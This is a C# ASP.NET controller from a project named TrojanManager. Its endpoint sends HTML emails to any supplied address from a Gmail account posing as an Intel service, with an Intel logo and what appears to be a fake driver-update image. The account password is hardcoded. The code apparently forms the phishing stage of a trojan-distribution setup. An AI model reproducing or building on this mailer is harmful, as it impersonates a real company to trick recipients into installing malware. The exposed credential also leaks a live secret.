using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace TrojanManager.Controllers
{
    public class EmailController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        static bool mailSent = false;
        private static void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)
        {
            // Get the unique identifier for this asynchronous operation.
            String token = (string)e.UserState;

            if (e.Cancelled)
            {
                Console.WriteLine("[{0}] Send canceled.", token);
            }
            if (e.Error != null)
            {
                Console.WriteLine("[{0}] {1}", token, e.Error.ToString());
            }
            else
            {
                Console.WriteLine("Message sent.");
            }
            mailSent = true;
        }

        // GET: Email
        public ActionResult SendEmail(String email)
        {
            try
            {
                SmtpClient client = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    UseDefaultCredentials = false,
                    DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network,
                };
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential("no.reply.intelservice@gmail.com", "Faniozii");

                string html = System.IO.File.ReadAllText(@"wwwroot\email.html");
                MailMessage mailMessage = new MailMessage();

                mailMessage.AlternateViews.Add(getEmbeddedImage(@"wwwroot\images\1200px-Intel-logo.svg.png", @"wwwroot\images\intelDriverUodates2.png"));

                mailMessage.From = new MailAddress("no.reply.intelservice@gmail.com");
                if(!String.IsNullOrEmpty(email))
                    mailMessage.To.Add(email);
                mailMessage.IsBodyHtml = true;
                mailMessage.Body = html;
                mailMessage.Subject = "subject";
                client.Send(mailMessage);
            }
            catch(Exception ex)
            {

            }

            return Ok();
        }

        private AlternateView getEmbeddedImage(String filePath1, String filePath2)
        {
            LinkedResource res1 = new LinkedResource(filePath1);
            res1.ContentId = Guid.NewGuid().ToString();

            LinkedResource res2 = new LinkedResource(filePath2);
            res2.ContentId = Guid.NewGuid().ToString();

            var htmlSB = new StringBuilder(System.IO.File.ReadAllText(@"wwwroot\email.html"));
            htmlSB.Replace("##1##", res1.ContentId);
            htmlSB.Replace("##2##", res2.ContentId);

            string htmlBody = htmlSB.ToString();
            AlternateView alternateView = AlternateView.CreateAlternateViewFromString(htmlBody, null, MediaTypeNames.Text.Html);
            alternateView.LinkedResources.Add(res1);
            alternateView.LinkedResources.Add(res2);
            return alternateView;
        }
    }
}